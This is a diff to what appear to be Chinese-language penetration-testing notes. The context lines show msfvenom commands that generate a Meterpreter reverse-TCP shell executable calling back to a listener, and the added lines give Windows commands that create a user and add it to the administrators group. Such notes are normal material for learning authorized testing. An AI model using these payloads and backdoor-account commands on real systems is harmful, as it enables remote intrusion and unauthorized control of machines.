@@ -110,3 +110,9 @@ staged的shell更稳定，不容易被杀毒软件发现，stageless更容易被
 msfvenom -p payload -f (.exe,.elf,.python,.asp,.php) -o filename lhost=127.0.0.1 lport=4444
 msfvenom -p windows/x86/meterprete/reverse_tcp -f .exe -o shell.exe lhost=192.168.0.2 lport=4444
 在metasplot中要选择 multi/handler 来发射 windows/x86/meterpreter/reverse_tcp 与上面的shell paylaod相对应
+
+
+Windows系统增加用户的命令
+net user <username> <password> /add
+
+net localgroup administrators <username> /add
